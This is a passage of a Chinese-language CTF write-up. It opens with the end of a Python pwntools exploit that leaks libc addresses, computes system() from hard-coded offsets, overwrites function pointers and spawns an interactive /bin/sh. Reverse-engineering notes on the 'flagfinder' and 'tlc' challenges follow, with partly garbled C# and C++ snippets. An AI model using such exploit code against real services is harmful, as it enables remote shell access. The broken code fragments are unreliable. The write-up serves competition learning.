             print [c for c in data]
             puts_real_addr = l32(data)
             print "puts_real_addr:", hex(puts_real_addr)
             view_words(io, 5)
             io.read_until("1: ")
             data = io.read(4)
             print [c for c in data]
             memset_real_addr = l32(data)
             print "memset_real_addr:", hex(memset_real_addr)
             #local
             offset_atoi = 0x0002fbb0
             offset_system = 0x0003e800
             #offset_puts = 0x000656a0
             #offset_memset = 0x0007c680
             #remote
             offset_atoi = 0x00031860
             offset_system = 0x00040190
             is_know = True
             if is_know == False:
                       offset_atoi = int(raw_input("atoi_off_set:"), 16)
                       offset_system = int(raw_input("system_off_set:"), 16)
                       #offset_puts = int(raw_input("puts_offset:"), 16)
                       #offset_memset = int(raw_input("memset_offset:"), 16)
             libc_real_addr = atoi_real_addr - offset_atoi
             system_real_addr = libc_real_addr + offset_system
             #puts_real_addr = libc_real_addr + offset_puts
             #memset_real_addr = libc_real_addr + offset_memset
             value_list = []
             payload = ""
             payload += l32(puts_real_addr) + 'a' * (len_to_write - 8) + l32(memset_real_addr) + l32(system_real_addr) #4
             value_list.append(payload +"n")
             value_list.append("n")
             print "begin to send useful data"
             add_new_words(io, 2, 0x0f101010, value_list, False)
             print "end to send useful data end"
             io.read_until("$ ")
             io.write("/bin/sh;n")
             io.interact()
    io = get_io(target)
    pwn(io)
flag如下:
## Reverse
### flagfinder (100)
该程序的逻辑就是在磁盘上搜索文件,找到一个文件的md5值为target值时,会计算其相应的sha1256的值,据此生成flag,代码如下:
    private static byte[] target = new byte[] { 0x6c, 0xcb, 0x61, 0x45, 90, 0xd8, 0x92, 0x19, 0x90, 0x2b, 0x3a, 0xf6, 10, 0x9a, 0x2d, 0x1c };
    Console.WriteLine("Analyzing " + file.FullName + " ...");
    MD5CryptoServiceProvider provider = new MD5CryptoServiceProvider();
    if (provider.ComputeHash(file.OpenRead()).SequenceEqual(target))
    {
        SHA256CryptoServiceProvider provider2 = new SHA256CryptoServiceProvider();
    Console.WriteLine("We've found the flag on your hard drive:");
    Console.WriteLine("ISG{" + BitConverter.ToString(provider2.ComputeHash(file.OpenRead())).ToLower() + "}");
        Environment.Exit(0);
    }
直接找文件肯定不行,解决方法是,计算md5后,google一下,找到网站上面有,如下:
将其sha256,带入,计算的结果:
### tlc (150)
分析程序,首先输入12字节,然后rot13,然后base64解码,然后做了一个判断(高n位能被n整除),最后用输入作为密钥解密一段数据,得到flag。
但是满足高n位能被n整除的数很多,于是爆破。
根据base64后数据位12字节,原始的数可能的位数为7,8,9。(先试的8和7都不行,最后才试的9)
首先生成满足高n位能被n整除的数据:
    #include 
    using namespace std;
    int main()
    {
        int i,j,temp;
        for (i=0;i1;j--)
            {
                if (temp % j == 0)
                {
                    temp=temp/10;
                    continue;
                }
                else
                {
                    break;
                }
            }
            if (j==1)
            {
                cout>5)) ^ (v12+v10)^(b+16*v12))
        v12 = v12 - ((c+(v11>>5) )^ ((v10+v11)^(d+16*v11)))
        v10 -= 0x47475349
    need (v12 == 0x8906C3AD)
    need (v11 == 0x0B442F5FC)
TEA加密算法,知道明文、密文,求key。不会。